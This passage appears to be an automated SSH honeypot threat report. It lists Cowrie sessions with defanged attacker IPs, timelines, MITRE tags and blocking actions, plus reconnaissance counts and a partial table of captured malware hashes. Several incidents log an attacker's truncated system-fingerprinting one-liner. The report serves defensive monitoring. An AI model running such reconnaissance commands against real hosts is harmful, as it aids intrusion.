| `2026-07-05 20:42:31` | `cowrie.session.connect` |
| `2026-07-05 20:42:32` | `cowrie.client.version` |
| `2026-07-05 20:42:32` | `cowrie.client.kex` |
| `2026-07-05 20:42:36` | `cowrie.login.success` |
| `2026-07-05 20:42:38` | `cowrie.session.params` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.success` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.command.input` |
| `2026-07-05 20:42:38` | `cowrie.log.closed` |
| `2026-07-05 20:42:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0df75fa7004

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 20:43 |
| **Last Seen** | 2026-07-05 20:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:43:49` | `cowrie.session.connect` |
| `2026-07-05 20:43:51` | `cowrie.client.version` |
| `2026-07-05 20:43:51` | `cowrie.client.kex` |
| `2026-07-05 20:43:57` | `cowrie.login.success` |
| `2026-07-05 20:44:00` | `cowrie.session.params` |
| `2026-07-05 20:44:00` | `cowrie.command.input` |
| `2026-07-05 20:44:01` | `cowrie.log.closed` |
| `2026-07-05 20:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-198d439cc7cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:44 |
| **Last Seen** | 2026-07-05 20:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:44:06` | `cowrie.session.connect` |
| `2026-07-05 20:44:07` | `cowrie.client.version` |
| `2026-07-05 20:44:07` | `cowrie.client.kex` |
| `2026-07-05 20:44:10` | `cowrie.login.success` |
| `2026-07-05 20:44:13` | `cowrie.session.params` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.success` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:13` | `cowrie.command.input` |
| `2026-07-05 20:44:14` | `cowrie.log.closed` |
| `2026-07-05 20:44:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b708fe11205

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:45 |
| **Last Seen** | 2026-07-05 20:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:45:43` | `cowrie.session.connect` |
| `2026-07-05 20:45:44` | `cowrie.client.version` |
| `2026-07-05 20:45:44` | `cowrie.client.kex` |
| `2026-07-05 20:45:48` | `cowrie.login.success` |
| `2026-07-05 20:45:50` | `cowrie.session.params` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.success` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:50` | `cowrie.command.input` |
| `2026-07-05 20:45:52` | `cowrie.log.closed` |
| `2026-07-05 20:45:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46c73e92d177

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:47 |
| **Last Seen** | 2026-07-05 20:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:47:19` | `cowrie.session.connect` |
| `2026-07-05 20:47:20` | `cowrie.client.version` |
| `2026-07-05 20:47:20` | `cowrie.client.kex` |
| `2026-07-05 20:47:24` | `cowrie.login.success` |
| `2026-07-05 20:47:27` | `cowrie.session.params` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.success` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:27` | `cowrie.command.input` |
| `2026-07-05 20:47:28` | `cowrie.log.closed` |
| `2026-07-05 20:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a28b56f9b61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:48 |
| **Last Seen** | 2026-07-05 20:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:48:56` | `cowrie.session.connect` |
| `2026-07-05 20:48:57` | `cowrie.client.version` |
| `2026-07-05 20:48:57` | `cowrie.client.kex` |
| `2026-07-05 20:49:02` | `cowrie.login.success` |
| `2026-07-05 20:49:04` | `cowrie.session.params` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.success` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:04` | `cowrie.command.input` |
| `2026-07-05 20:49:06` | `cowrie.log.closed` |
| `2026-07-05 20:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3031a4e7ed

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:50 |
| **Last Seen** | 2026-07-05 20:50 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:50:32` | `cowrie.session.connect` |
| `2026-07-05 20:50:32` | `cowrie.client.version` |
| `2026-07-05 20:50:33` | `cowrie.client.kex` |
| `2026-07-05 20:50:36` | `cowrie.login.success` |
| `2026-07-05 20:50:39` | `cowrie.session.params` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.success` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:39` | `cowrie.command.input` |
| `2026-07-05 20:50:41` | `cowrie.log.closed` |
| `2026-07-05 20:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c765cb31598

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-05 20:52 |
| **Last Seen** | 2026-07-05 20:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:52:00` | `cowrie.session.connect` |
| `2026-07-05 20:52:00` | `cowrie.client.version` |
| `2026-07-05 20:52:00` | `cowrie.client.kex` |
| `2026-07-05 20:52:00` | `cowrie.login.success` |
| `2026-07-05 20:52:00` | `cowrie.direct-tcpip.request` |
| `2026-07-05 20:52:00` | `cowrie.direct-tcpip.data` |
| `2026-07-05 20:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cb799960f22

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:52 |
| **Last Seen** | 2026-07-05 20:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:52:03` | `cowrie.session.connect` |
| `2026-07-05 20:52:04` | `cowrie.client.version` |
| `2026-07-05 20:52:04` | `cowrie.client.kex` |
| `2026-07-05 20:52:08` | `cowrie.login.success` |
| `2026-07-05 20:52:11` | `cowrie.session.params` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.success` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:11` | `cowrie.command.input` |
| `2026-07-05 20:52:12` | `cowrie.log.closed` |
| `2026-07-05 20:52:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d5579f0d825

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]10` |
| **First Seen** | 2026-07-05 20:53 |
| **Last Seen** | 2026-07-05 20:53 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 20:53:36` | `cowrie.session.connect` |
| `2026-07-05 20:53:36` | `cowrie.client.version` |
| `2026-07-05 20:53:36` | `cowrie.client.kex` |
| `2026-07-05 20:53:40` | `cowrie.login.success` |
| `2026-07-05 20:53:42` | `cowrie.session.params` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.success` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:42` | `cowrie.command.input` |
| `2026-07-05 20:53:43` | `cowrie.log.closed` |
| `2026-07-05 20:53:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]10` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `164.92.115[.]22` | **195** | 2026-07-05 18:55 | 2026-07-05 20:53 | 134m | 0 | `T1592` | 🟠 MEDIUM |
| `179.61.192[.]156` | **71** | 2026-07-05 18:56 | 2026-07-05 20:54 | 76m | 0 | `T1592` | 🟠 MEDIUM |
| `206.81.2[.]201` | **50** | 2026-07-05 18:56 | 2026-07-05 20:54 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `67.220.180[.]114` | **2** | 2026-07-05 19:13 | 2026-07-05 19:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]10` | **2** | 2026-07-05 20:19 | 2026-07-05 20:34 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-05 19:38 | 2026-07-05 19:38 | 35s | 0 | `T1592` | 🟢 LOW |
| `120.48.14[.]72` | 1 | 2026-07-05 20:20 | 2026-07-05 20:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]111` | 1 | 2026-07-05 20:06 | 2026-07-05 20:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-05 19:13 | 2026-07-05 19:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.91.153[.]60` | 1 | 2026-07-05 20:11 | 2026-07-05 20:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `220.132.89[.]220` | 1 | 2026-07-05 20:24 | 2026-07-05 20:24 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]157` | 1 | 2026-07-05 19:05 | 2026-07-05 19:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-07-05 20:37 | 2026-07-05 20:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]252` | 1 | 2026-07-05 19:38 | 2026-07-05 19:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.142.44[.]95` | 1 | 2026-07-05 20:40 | 2026-07-05 20:41 | 71s | 0 | `T1592` | 🟢 LOW |
| `58.56.200[.]238` | 1 | 2026-07-05 19:40 | 2026-07-05 19:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `61.178.209[.]47` | 1 | 2026-07-05 19:24 | 2026-07-05 19:24 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-07-05 20:34 | 2026-07-05 20:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.28.167[.]30` | 1 | 2026-07-05 19:44 | 2026-07-05 19:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]46` | 1 | 2026-07-05 18:56 | 2026-07-05 18:57 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 50/100 | 🟡 MEDIUM | **25/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 85/100 | 🔴 HIGH | **38/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
